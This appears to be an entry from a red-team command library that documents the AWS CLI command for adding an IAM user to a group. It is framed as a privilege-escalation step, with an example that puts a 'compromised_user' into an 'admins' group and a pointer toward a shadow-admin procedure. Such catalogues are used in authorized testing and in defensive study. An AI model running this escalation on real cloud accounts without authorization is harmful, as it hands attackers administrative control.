---
id: 98e6d4a0-43ba-4bae-94a3-6cba90a801c0
name: aws-iam-add-user-to-group
type: command
executor: bash
data: aws iam add-user-to-group --group-name $_GROUP_NAME --user-name $_USER_NAME
output: null
created_at: '2023-04-06T03:56:09.318563+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - AWS
tags:
  - iam
  - privilege-escalation
verified: true
validated: true
---

# aws-iam-add-user-to-group

## Command

```bash
aws iam add-user-to-group --group-name $_GROUP_NAME --user-name $_USER_NAME
```

## Description

Adds an IAM user to a specified group, inheriting the group's permissions for escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --group-name $_GROUP_NAME | Name of the target IAM group | Yes |
| --user-name $_USER_NAME | Name of the user to add | Yes |

## Examples

### Basic Usage

```bash
aws iam add-user-to-group --group-name admins --user-name compromised_user
```

### Advanced Usage

Combine with policy attachment for full escalation.

## Expected Output

{
    "UserName": "compromised_user"
}
No errors indicate success.

## Related

- [[procedures/AWS-Shadow-Admin-Access]]
